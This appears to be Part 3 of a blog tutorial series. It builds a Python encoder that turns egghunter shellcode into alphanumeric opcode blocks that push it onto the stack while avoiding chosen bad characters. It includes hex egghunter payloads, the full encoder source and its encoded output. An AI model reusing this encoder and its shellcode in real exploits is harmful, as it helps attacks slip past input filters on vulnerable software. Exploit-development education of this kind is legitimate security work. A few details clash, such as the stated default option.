---
layout: article
title: Building an Alphanumeric Encoder Part 3 - Building the Encoder
permalink: /page/building-an-alphanumeric-encoder-part-3
key: page-article-header-overlay-background-image-HB
cover: /assets/images/thumbs/alphanumeric-encoder-part-3.png
header:
  theme: dark
  background: 'linear-gradient(135deg, rgb(15, 32, 39), rgb(44, 83, 100))'
article_header:
  type: overlay
  theme: dark
  background_color: '#0F2027'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(15, 32, 39, .6), rgba(44, 83, 100, .6))'
    src: /assets/images/posts/alphanumeric-encoder-part-3/cover.png
---

Building the final alphanumeric encoder.

<!--more-->

<style>
  .page__header .header__brand path {
    fill: rgba(255, 255, 255, .95);
  }
</style>

## Objective
This is the third post of a multi-part series exploring the process of creating a custom alphanumeric shellcode encoder. In <a href="http://www.datkev.github.io/page/building-an-alphanumeric-encoder-part-2.html" target="_blank">Part 2</a>, we discovered how working with integer partitions can help us with the encoding process. In Part 3, we will extend the functionality of <b>partitions-test.py</b> to enable a user to specify a list of bad characters to avoid when generating the encoded shellcode. 



## Revisiting the Outline
In <a href="http://www.datkev.github.io/page/building-an-alphanumeric-encoder-part-1.html" target="_blank">Part 1</a> of this series, we mapped out the general flow of our desired program. For the reader's convenience, the outline is provided below.

1. Take the raw egghunter as user input

2. Pad the instructions to a multiple of 4

3. Split the egghunter into 4-byte chunks

4. Reverse the order of the 4-byte chunks (we need to push the egghunter onto the stack starting from end -> beginning) 

5. Encoding Loop:<br>
   * Point at the first 4-byte chunk (after reversing the chunk order)<br>
   * Take the two’s complement<br>
   * Generate a <a href="https://en.wikipedia.org/wiki/Partition_(number_theory)" _target="blank">partition</a> containing three operands comprised only of good characters<br>
   * Store operands<br>
   * Increment four bytes<br>
   * If we have not hit the end, loop back to second bullet.<br>

6. Print Loop:<br>
   * Block begins with op codes for <code>zero eax</code>:<br>
     * <b>\x25\x4a\x4d\x4e\x55</b><br>
     * <b>\x25\x35\x32\x31\x2a</b><br> 
   * For three consecutive operands:<br>
     * Append <b>\x2d</b> to operand  <br>
     * Print operand  <br>
   * Block ends with op code for <code>push eax</code><br>
   * If more operands left, loop back to step 6a.


In Part 2 of this series, we'll go on to explore how we can use functions that generate integer partitions to help us automate the encoding process. 



### Parsing Arguments
For Step 1, instead of making the user pass in an egghunter as an argument, we can instead provide hardcoded egghunters as menu options for users to select. This way we can avoid unnecessarily long arguments.

For the egghunter menu, we'll use a list of egghunters gathered from Matt Miller's infamous <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" target="_blank">paper</a>. Instead of restricting the user to a predefined tag, we can use placeholder characters and allow the user to specify a custom tag.

We'll use the <a href="https://docs.python.org/3/library/argparse.html" target="_blank">argparse</a> library so users can specify options using flags.

```py
'''
--------------
Egghunter menu:
--------------
0: Windows SEH
1: Windows IsBadReadPtr
2: Windows NtDisplayString
3: Windows NtAccessCheckandAuditAlarm
4: Linux access(2)
5: Linux access(2) revisited
6: Linux sigaction(2)
'''
egghunter_map = {
    0: "EB2159B8????????516AFF33DB6489236A02598BFBF3AF7507FFE76681CBFF0F43EBEDE8DAFFFFFF6A0C598B040CB1B8830408065883C4105033C0C3",
    1: "33DB6681CBFF0F436A0853B80D5BE777FFD085C075ECB8????????8BFBAF75E7AF75E4FFE7",
    2: "6681CAFF0F42526A4358CD2E3C055A74EFB8????????8BFAAF75EAAF75E7FFE7",
    3: "6681CAFF0F42526A0258CD2E3C055A74EFB8????????8BFAAF75EAAF75E7FFE7",
    4: "BB????????31C9F7E16681CAFF0F42608D5A04B021CD803CF26174ED391A75EE395A0475E9FFE2",
    5: "31D26681CAFF0F428D5A046A2158CD803CF274EEB8????????89D7AF75E9AF75E6FFE7",
    6: "6681C9FF0F416A4358CD803CF274F1B8????????89CFAF75ECAF75E9FFE7"
}



'''
Uses argparse to accept arguments
Arguments: bad, egghunter, pad, tag
'''
def check_args(args):
    ap = argparse.ArgumentParser(description = "Alphanumeric egghunter stack pusher",
                                 formatter_class = argparse.RawTextHelpFormatter)
    ap.add_argument("-b", "--bad", metavar="BAD CHARS",
                    help = "Bad characters to exclude in payload\n"
                           "e.g. '\\x00\\xb4\\xd9'\n"
                           "Default: Non-alphanumeric characters",
                    default = ("\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f"
                               "\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f"
                               "\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f"
                               "\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f"
                               "\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf"
                               "\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf"
                               "\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf"
                               "\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf"
                               "\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef"
                               "\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"))
    ap.add_argument("-e", "--egghunter", metavar="#",
                    help = "Specific egghunter to encode:\n"
                           "0: Windows - SEH - 60 bytes\n"
                           "1: Windows - IsBadReadPtr - 40 bytes\n"
                           "2: Windows - NtDisplayString - 32 bytes\n"
                           "3: Windows - NtAccessCheckAndAuditAlarm - 32 bytes\n"
                           "4: Linux - access(2) - 40 bytes\n"
                           "5: Linux - access(2) revisited - 36 bytes\n"
                           "6: Linux - sigaction(2) - 32 bytes\n"
                           "Default: 2",
                    choices = range(0,7),
                    type = int,
                    default = 1)
    ap.add_argument("-p", "--pad",
                    help = "Byte to pad egghunter with before encoding\n"
                           "e.g. '\\x90'\n"
                           "Default: \\x90",
                    default = "\\x90")
    ap.add_argument("-t", "--tag",
                    help = "Four byte tag that egghunter will search for\n"
                           "e.g. 'w00t'\n"
                           "Default: w00t",
                    default = "w00t")

    options = ap.parse_args(args)
    return(options)
```

By specifying the <b>-h</b> flag, the argparse help menu should look similar to the output below:
<img src="/assets/images/posts/alphanumeric-encoder-part-3/01.png" alt="" class="center">

### Formatting the Egghunter

As you can see from our egghunter mapping in the code above, the egghunter lengths vary from option to option. We'll need to pad the egghunters to a multiple of four. We allow the user to specify the character to pad the egghunter with and what tag to use. The functions below are implemented to help with these tasks:

```py
"""
Strips hex bytes prepended with a blackslash
Intput: hex byte(s) string prepended with blackslash x
"""
def strip_bytes(hex_bytes):
    stripped = hex_bytes.replace("\\x","")
    return stripped



'''
Returns byte representation of egghunter tag
Input: egghunter tag
'''
def tag_to_hex(tag):
    tag_bytes = ""
    for c in tag:
        tag_bytes += hex(ord(c)).replace("0x","")
    return tag_bytes



'''
Returns egghunter formatted with tag bytes
Input: hunter number, ascii tag
'''
def format_egghunter(num,tag,pad):
    egghunter = egghunter_map[num]
    tag_bytes = tag_to_hex(tag)
    num_to_pad = 0

    formatted = egghunter.replace("????????",tag_bytes)

    num_to_pad = 4 - (len(formatted)/2) % 4

    if num_to_pad != 4:
        formatted += strip_bytes(pad) * num_to_pad

    return formatted

```

At this point, we can define a main function to test our code.

```py
def main():
    a = check_args(sys.argv[1:])
    egghunter = format_egghunter(a.egghunter,a.tag,a.pad)
    print(egghunter)        # DEBUG



if __name__ == "__main__":
    main()
```

If we run our code with the <b>Windows IsBadReadPtr</b> egghunter specified, we can see that padding is properly applied and our tag can be seen in lower case (<b>6d306d30</b>). 

```
# ./encoder-test.py -b "\x22\x2d" -e 1 -t "m0m0"
33DB6681CBFF0F436A0853B80D5BE777FFD085C075ECB86d306d308BFBAF75E7AF75E4FFE7909090
# ./encoder-test.py -b "\x22\x2d" -e 1 -t "m0m0" -p "\x40"
33DB6681CBFF0F436A0853B80D5BE777FFD085C075ECB86d306d308BFBAF75E7AF75E4FFE7404040
```


### Reversing the Egghunter

Before we pass input into the functions <b>restricted_partitions()</b> and <b>format_summands()</b> defined in Part 2, we'll need to separate each chunk of four bytes and reverse the order of those chunks. We will also need to take the two's complement of each of those little-endian formatted chunks. Finally, we must split the two's complement chunks into lists of four individual bytes. Each of these lists will be passed into the <b>restricted_partitions()</b> function.

Bearing in mind that the egghunter is a string of characters where each <i>pair</i> of characters represents the value of an individual hex byte (e.g. 90 represents \x90), the code to generate properly formatted input for the <b>restricted_partitions</b> function is shown below:

```py
'''
Takes the egghunter as a string and splits it into four-byte chunks.
The chunks are reversed and the two's complement of each chunk is generated.
Each two's complement chunk is further split into its individual bytes.
Input: Egghunter string
'''
def reverse_and_split(egghunter):
    chunks = [egghunter[i:i+8] for i in range(0, len(egghunter), 8)] # separate chunks
    print("Egghunter chunks:\n{}".format(chunks))       # DEBUG

    chunks = chunks[::-1] # reverse chunks
    print("Egghunter chunks reversed:\n{}".format(chunks))       # DEBUG

    return(split_chunks(twos_comp(chunks)))



'''
Converts signed int to hex
'''
def to_hex(val):
    new_val = 0
    new_val = hex((val + (1 << 32)) % (1 << 32))
    if new_val[-1] == "L":
        new_val = new_val[2:-1]
    else:
        new_val = new_val[2:]
    num_to_pad = 0
    if (len(new_val) < 8):
        num_to_pad = 8 - len(new_val)
        new_val = "0" * num_to_pad + new_val
    return new_val



'''
Takes the two's complement of four-byte egghunter chunks
Input: List of egghunter chunks
'''
def twos_comp(chunks):
    tc_chunks = []

    chunks = [struct.pack("<I",int(chunks[i],16)) for i in range(0, len(chunks))] # chunks to little-endian
    print("Little-endian chunks:\n{}".format(chunks))       # DEBUG

    for i in range(0, len(chunks)):
        val = struct.unpack(">I", chunks[i])[0]
        if val > ((1 << 31) - 1):
            val -= (1 << 32) # manually convert unsigned int to signed int
        tc_chunks.append(to_hex(-val))
        # tc_chunks.append(int.from_bytes(chunks[i], byteorder="big",signed=True)) # Python 3

    print("Two's complement chunks:\n{}".format(tc_chunks))     # DEBUG
    return(tc_chunks)



'''
Takes the two's complement chunks and splits them into individual bytes 
Input: List of two's complement values as strings of bytes
'''
def split_chunks(chunks):
    split_chunks = []
    for i in range(len(chunks)):
        split_chunks.append(["","","",""])

    for i in range(0, len(chunks)):
        for j in range(4):
            k = j*2
            split_chunks[i][j] = chunks[i][k:k+2]

    print("Split chunks:\n{}".format(split_chunks))     # DEBUG
    return(split_chunks)
```

Above, we've added some print commands (labeled with <b># DEBUG</b>) to walk us through how the list of bytes is generated from the egghunter string. 

```py
def main():
    a = check_args(sys.argv[1:])
    egghunter = format_egghunter(a.egghunter,a.tag,a.pad)
    print(egghunter)        # DEBUG

    reverse_and_split(egghunter)
```

The output of the encoder is shown below:


```
# ./encoder-test.py -b "\x21\x44\x5f" -e 3 -t m0m0
6681CAFF0F42526A0258CD2E3C055A74EFB86d306d308BFAAF75EAAF75E7FFE7
Egghunter chunks:
['6681CAFF', '0F42526A', '0258CD2E', '3C055A74', 'EFB86d30', '6d308BFA', 'AF75EAAF', '75E7FFE7']
Egghunter chunks reversed:
['75E7FFE7', 'AF75EAAF', '6d308BFA', 'EFB86d30', '3C055A74', '0258CD2E', '0F42526A', '6681CAFF']
Little-endian chunks:
['\xe7\xff\xe7u', '\xaf\xeau\xaf', '\xfa\x8b0m', '0m\xb8\xef', 'tZ\x05<', '.\xcdX\x02', 'jRB\x0f', '\xff\xca\x81f']
Two's complement chunks:
['1800188b', '50158a51', '0574cf93', 'cf924711', '8ba5fac4', 'd132a7fe', '95adbdf1', '00357e9a']
Split chunks:
[['18', '00', '18', '8b'], ['50', '15', '8a', '51'], ['05', '74', 'cf', '93'], ['cf', '92', '47', '11'], ['8b', 'a5', 'fa', 'c4'], ['d1', '32', 'a7', 'fe'], ['95', 'ad', 'bd', 'f1'], ['00', '35', '7e', '9a']]
```


At this point, we're almost ready to pass input into <b>restricted_partitions()</b>. You may recall that the function also takes a list of good characters in the form of decimal (base 10) values. We'll need to generate this list from user-provided bad characters or resort to the default list of good characters.


### Filtering Bad Characters
Since we are taking bad characters as input, we'll need to covert the string of hex bytes into a list of decimal values. The following function handles this task for us:

```py
'''
Takes a string of bad characters and converts the hex bytes into decimal values.
Returns a list of good characters in the form of decimal values.
Input: Bad characters hex string
'''
def filter_chars(bad_chars):
    filtered = set([i for i in range(256)])
    bad_chars = strip_bytes(bad_chars)

    for i in range(0,len(bad_chars),2):
        filtered.remove(int(bad_chars[i:i+2],16))

    print(filtered)     # DEBUG
    return(filtered)
```

We can add a line after <b>reverse_and_split()</b> to test our <b>filter_chars()</b> function. The output generated by <b>encoder-test.py</b> shows that the set of good characters does not contain the decimal equivalents of <b>\x21</b> (decimal 33), <b>\x44</b> (decimal 68), and <b>\x5f</b> (decimal 95) as specified by the user. All output besides the set of good characters have been omitted. 

```py
def main():
    a = check_args(sys.argv[1:])
    egghunter = format_egghunter(a.egghunter,a.tag,a.pad)
    print(egghunter)

    reverse_and_split(egghunter)
    filter_chars(a.bad)
```

```
# ./encoder-test.py -b "\x21\x44\x5f" -e 3 -t m0m0
set([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255])
```



### Generating Summands
Finally, we are ready to pass both the list of two's complement split bytes and good characters to <b>restricted_partitions()</b>. After generating partitions for each of the two's complement bytes, we'll need to distribute the integers within the partitions into corresponding summands. The code that accomplishes this for us is shown below:

```py
'''
Passes bytes from the two's complement byte list into restricted_partitions()
along with a set of good characters.
Input: List of lists of four bytes per two's complement chunk, list of good character decimal values
'''
def generate_summands(tc_bytes, good_chars):
    partitions = []
    failed = False
    i = 0

    while ((i < len(tc_bytes)) and not failed):
        partitions.append([])
        carry = False
        j = 3

        while (j >= 0):
            target = int(tc_bytes[i][j],16)
            if (carry):
                target -= 1
            if (target < 96):
                target += 256
                carry = True
            else:
                carry = False

            part = restricted_partitions(target, good_chars, len(good_chars), 3, [], 0)
            if (part == []):
                failed = True
                break
            else:
                partitions[i] += part

            j -= 1

        i += 1

    if (failed):
        return 0

    print(partitions)       # DEBUG
    return(format_summands(partitions))



'''
Finds integer partitions. Partitions used to construct summands to manipulate eax register
Input: Integers from hex bytes of two's complement egghunter chunks
'''
def restricted_partitions(n, good_chars, end_index, slots, part, i):
    # base case
    if (slots == 1):
        if (n in good_chars):
            part = copy.copy(part)
            if (i > len(part)-1): # append to part
                part.append(n)
            else: # replace in part
                part[i] = n
            parts = [part]
        else:
            parts = []
    # recursive case
    else:
        part = copy.copy(part)
        parts = []
        for j in range(end_index):
            if (len(parts) == 1):
                return parts
            if ((good_chars[j] + (slots-1)*good_chars[0] <= n) and (n <= slots*good_chars[j])):
                if (i > len(part)-1):
                    part.append(good_chars[j]) # append to part
                else:
                    part[i] = good_chars[j] # replace in part

                parts = parts + restricted_partitions(n-good_chars[j], good_chars, j+1, slots-1, part, i+1)
    return parts



'''
Distributes chunks within int_list into three summands.
Three ints per list, four lists per chunk, one chunk distributed amongst three summands.
Input: List containing chunks of four lists (three integers per list) from restricted_partitions 
'''
def format_summands(int_list):
    summands = []
    print("Integer partitions:\n{}".format(int_list))       # DEBUG
    for i in range(0,len(int_list)):
        summands.append(["","",""])
        for j in range(4):
            for k in range(3):
                summands[i][k] += "\\x{}".format(hex(int_list[i][j].pop())[2:4]) # dec to hex string conversion


    print("Summands:\n{}".format(summands))     # DEBUG
    return(summands)
```

As usual, some print commands have been included to help us see how the summands are being generated. Within the list of integer partitions, we have lists containing four partitions each. Each of these lists containing partitions corresponds to a four-byte two's complement chunk of the egghunter. We need three summands per chunk. The list of summands has been formatted in little-endian and correctly ordered for printing op codes blocks to console output.

```py
def main():
    a = check_args(sys.argv[1:])
    egghunter = format_egghunter(a.egghunter,a.tag,a.pad)
    tc_egghunter = reverse_and_split(egghunter)
    good_chars = list(filter_chars(a.bad))
    generate_summands(tc_egghunter, good_chars)
```

```
Integer partitions:
[[[47, 46, 46], [94, 93, 93], [85, 85, 85], [93, 93, 93]], [[113, 112, 112], [46, 46, 45], [93, 92, 92], [112, 112, 111]], [[49, 49, 49], [69, 69, 69], [39, 39, 38], [87, 87, 87]], [[91, 91, 91], [109, 109, 108], [49, 48, 48], [69, 69, 69]], [[66, 65, 65], [84, 83, 83], [55, 55, 55], [47, 46, 46]], [[85, 85, 84], [56, 56, 55], [102, 102, 102], [70, 69, 69]], [[81, 80, 80], [63, 63, 63], [58, 58, 57], [50, 50, 49]], [[52, 51, 51], [42, 42, 42], [103, 103, 103], [85, 85, 85]]]
Summands:
[['\\x2e\\x5d\\x55\\x5d', '\\x2e\\x5d\\x55\\x5d', '\\x2f\\x5e\\x55\\x5d'], ['\\x70\\x2d\\x5c\\x6f', '\\x70\\x2e\\x5c\\x70', '\\x71\\x2e\\x5d\\x70'], ['\\x31\\x45\\x26\\x57', '\\x31\\x45\\x27\\x57', '\\x31\\x45\\x27\\x57'], ['\\x5b\\x6c\\x30\\x45', '\\x5b\\x6d\\x30\\x45', '\\x5b\\x6d\\x31\\x45'], ['\\x41\\x53\\x37\\x2e', '\\x41\\x53\\x37\\x2e', '\\x42\\x54\\x37\\x2f'], ['\\x54\\x37\\x66\\x45', '\\x55\\x38\\x66\\x45', '\\x55\\x38\\x66\\x46'], ['\\x50\\x3f\\x39\\x31', '\\x50\\x3f\\x3a\\x32', '\\x51\\x3f\\x3a\\x32'], ['\\x33\\x2a\\x67\\x55', '\\x33\\x2a\\x67\\x55', '\\x34\\x2a\\x67\\x55']]
```


Let's confirm that our summands have been generated correctly:

```
# ./encoder-test.py -b "\x21\x44\x5f" -e 3 -t m0m0
6681CAFF0F42526A0258CD2E3C055A74EFB86d306d308BFAAF75EAAF75E7FFE7


# Reversed chunks in little-endian:
# e7ffe775
# afea75af
# fa8b306d
# 306db8ef
# 745a053c
# 2ecd5802
# 6a52420f
# ffca8166
```


Below, we will take each block of summands and subtract the values from 0:<br>
0 - 5d555d2e - 5d555d2e - 5d555e2f = <b>e7ffe775</b><br>
0 - 6f5c2d70 - 705c2e70 - 705d2e71 = <b>afea75af</b><br>
0 - 57264531 - 57274531 - 57274531 = <b>fa8b306d</b><br>
0 - 45306c5b - 45306d5b - 45316d5b = <b>306db8ef</b><br>
0 - 2e375341 - 2e375341 - 2f375442 = <b>745a053c</b><br>
0 - 45663754 - 45663855 - 46663855 = <b>2ecd5802</b><br>
0 - 31393f50 - 323a3f50 - 323a3f51 = <b>6a52420f</b><br>
0 - 55672a33 - 55672a33 - 55672a34 = <b>ffca8166</b><br>


It seems as though our egghunter has kept its integrity after the "encoding" process. The results above show the order in which we must push the bytes onto the stack in order for the egghunter to appear as it should in memory. We will demonstrate this concept when we test the egghunter in a real exploit.


### Printing to Console
Our egghunter encoder is almost complete. All that is left for us to do is to print the op codes necessary for pushing our desired egghunter onto the stack. We also need to bear in mind that in some cases, the <b>restricted_partitions()</b> function which returns partitions of our two's complement bytes may not be able to generate any integer partitions compatible with the specified bad characters. In this scenario, we'll check that the <b>generate_summands()</b> function did not return 0. In the case of a 0 return value, we notify the user that the egghunter could not be encoded.

```py
'''
Prints op codes for encoded egghunter. Op codes will push the egghunter onto the stack.
Input: List of summands for each block of the egghunter. Each block pushes one four-byte chunk
of the egghunter onto the stack.
'''
def print_egghunter(summands):
    zero_eax_1 = "\\x25\\x4a\\x4d\\x4e\\x55"
    zero_eax_2 = "\\x25\\x35\\x32\\x31\\x2a"
    push_eax = "\\x50"

    for i in range(len(summands)):
        print("******BLOCK {}*******".format(i))
        print(zero_eax_1)
        print(zero_eax_2)
        for j in range(3):
            print("\\x2d{}".format(summands[i][j]))

        print(push_eax)
```

```py
def main():
    a = check_args(sys.argv[1:])
    egghunter = format_egghunter(a.egghunter,a.tag,a.pad)
    tc_egghunter = reverse_and_split(egghunter)
    good_chars = list(filter_chars(a.bad))
    summands = generate_summands(tc_egghunter, good_chars)
    if (summands):
        print_egghunter(summands)
    else:
        print("[!] Could not encode egghunter. Bad characters too restrictive.")
```

```
# ./encoder-test.py -b "\x21\x44\x5f" -e 3 -t m0m0
******BLOCK 0*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x2e\x5d\x55\x5d
\x2d\x2e\x5d\x55\x5d
\x2d\x2f\x5e\x55\x5d
\x50
******BLOCK 1*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x70\x2d\x5c\x6f
\x2d\x70\x2e\x5c\x70
\x2d\x71\x2e\x5d\x70
\x50
******BLOCK 2*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x31\x45\x26\x57
\x2d\x31\x45\x27\x57
\x2d\x31\x45\x27\x57
\x50
******BLOCK 3*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x5b\x6c\x30\x45
\x2d\x5b\x6d\x30\x45
\x2d\x5b\x6d\x31\x45
\x50
******BLOCK 4*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x41\x53\x37\x2e
\x2d\x41\x53\x37\x2e
\x2d\x42\x54\x37\x2f
\x50
******BLOCK 5*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x54\x37\x66\x45
\x2d\x55\x38\x66\x45
\x2d\x55\x38\x66\x46
\x50
******BLOCK 6*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x50\x3f\x39\x31
\x2d\x50\x3f\x3a\x32
\x2d\x51\x3f\x3a\x32
\x50
******BLOCK 7*******
\x25\x4a\x4d\x4e\x55
\x25\x35\x32\x31\x2a
\x2d\x33\x2a\x67\x55
\x2d\x33\x2a\x67\x55
\x2d\x34\x2a\x67\x55
\x50
```


In the next post, we'll test our encoded egghunter on a Windows XP SP3 box running Eureka Mail Client v2.2q.
